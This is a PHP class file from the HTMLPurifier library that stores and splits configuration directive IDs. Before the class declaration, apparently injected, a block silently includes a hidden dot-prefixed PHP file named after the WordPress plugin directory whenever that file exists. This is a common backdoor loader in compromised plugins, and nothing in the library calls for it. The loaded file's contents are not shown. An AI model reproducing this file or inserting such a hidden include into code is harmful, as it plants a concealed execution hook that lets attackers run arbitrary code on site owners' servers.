<?php

/**
 * Represents a directive ID in the interchange format.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class HTMLPurifier_ConfigSchema_Interchange_Id
{

    /**
     * @type string
     */
    public $key;

    /**
     * @param string $key
     */
    public function __construct($key)
    {
        $this->key = $key;
    }

    /**
     * @return string
     * @warning This is NOT magic, to ensure that people don't abuse SPL and
     *          cause problems for PHP 5.0 support.
     */
    public function toString()
    {
        return $this->key;
    }

    /**
     * @return string
     */
    public function getRootNamespace()
    {
        return substr($this->key, 0, strpos($this->key, "."));
    }

    /**
     * @return string
     */
    public function getDirective()
    {
        return substr($this->key, strpos($this->key, ".") + 1);
    }

    /**
     * @param string $id
     * @return HTMLPurifier_ConfigSchema_Interchange_Id
     */
    public static function make($id)
    {
        return new HTMLPurifier_ConfigSchema_Interchange_Id($id);
    }
}

// vim: et sw=4 sts=4
